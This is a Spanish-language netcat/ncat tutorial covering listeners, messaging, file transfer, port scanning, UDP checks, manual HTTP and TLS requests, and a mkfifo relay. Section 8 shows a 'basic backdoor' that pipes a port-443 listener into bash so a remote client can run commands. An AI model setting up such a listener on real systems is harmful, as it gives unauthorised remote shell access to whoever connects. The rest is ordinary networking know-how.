## Netcat ( de Nmap )

Netcat (a veces abreviado como nc) es una herramienta de red versátil que permite:

Abrir conexiones TCP/UDP.
Escuchar en puertos.
Enviar y recibir datos brutos a través de la red.
Transferir archivos.
Escanear puertos.
Simular servicios simples.

## 📡 1. **Servidor simple escuchando en un puerto**

```bash
nc -lvp 4444
```

- `-l`: Modo escucha (listen).
- `-v`: Verbose (muestra detalles).
- `-p`: Puerto a usar.

Ahora estás listo para recibir conexiones desde otro equipo:

```bash
nc IP_DEL_SERVIDOR 4444
```

Cualquier texto que escribas en uno aparecerá en el otro.

---

## 💬 2. **Enviar mensajes entre dos máquinas**

**En el servidor:**
```bash
nc -lvp 5000
```

**En el cliente:**
```bash
nc 192.168.1.100 5000
```

Escribe cualquier cosa en el cliente y aparecerá en la consola del servidor.

---

## 📁 3. **Transferir archivos entre dos equipos**

### ✅ En el servidor (recibe el archivo):
```bash
nc -lvp 6000 > recibido.txt
```

### ✅ En el cliente (envía el archivo):
```bash
nc 192.168.1.100 6000 < archivo.txt
```

Después de unos segundos, `archivo.txt` se habrá copiado al servidor como `recibido.txt`.

---

## 🧪 4. **Prueba de conectividad a un servicio**

```bash
nc -zv google.com 80
```

- `-z`: Escanea sin enviar datos.
- Comprueba si el puerto 80 (HTTP) está abierto.

También útil para comprobar si servicios como SSH o MySQL están activos:

```bash
nc -zv 192.168.1.100 22   # Prueba conexión SSH
nc -zv 192.168.1.100 3306 # Prueba conexión MySQL
```

---

## 🔍 5. **Escaneo de puertos**

```bash
nc -zv 192.168.1.1 20-100
```

Muestra qué puertos entre el 20 y el 100 están abiertos en la dirección IP especificada.

---

## 📶 6. **Usar UDP en lugar de TCP**

```bash
nc -uvz 192.168.1.1 53
```

Útil para probar servicios UDP como DNS (puerto 53).

---

## 🔄 7. **Conectar a un servicio web manualmente (HTTP)**

```bash
nc www.ejemplo.com 80
```

Una vez conectado, escribe:

```
GET / HTTP/1.1
Host: www.ejemplo.com

```

Presiona Enter dos veces y obtendrás la respuesta del servidor web.

---

## 🛑 8. **Crear un "backdoor" básico (solo en entornos controlados)**

**Servidor (escucha y ejecuta comandos):**
```bash
nc -lvp 443 | bash
```

**Cliente (envía comandos):**
```bash
nc 192.168.1.100 443
```

Luego escribes comandos como `ls`, `whoami`, etc., y se ejecutan en el servidor.

---

## 🔐 9. **Conexión SSL/TLS con `ncat` (Nmap)**

Si usas `ncat` (versión avanzada), puedes conectarte a sitios HTTPS:

```bash
ncat --ssl google.com 443
```

Y luego enviar una solicitud HTTP:

```
GET / HTTP/1.1
Host: google.com

```

Recibirás la respuesta del servidor HTTPS.

---

## 🔄 10. **Redirección de flujos con `ncat` (avanzado)**

Puedes usar `ncat` para crear un proxy inverso o canalizar información.

Ejemplo:
```bash
mkfifo pipe
ncat -lvp 8080 < pipe | nc google.com 80 > pipe
```

Este ejemplo reenvía todo lo que entra por el puerto 8080 a Google y devuelve la respuesta.

---
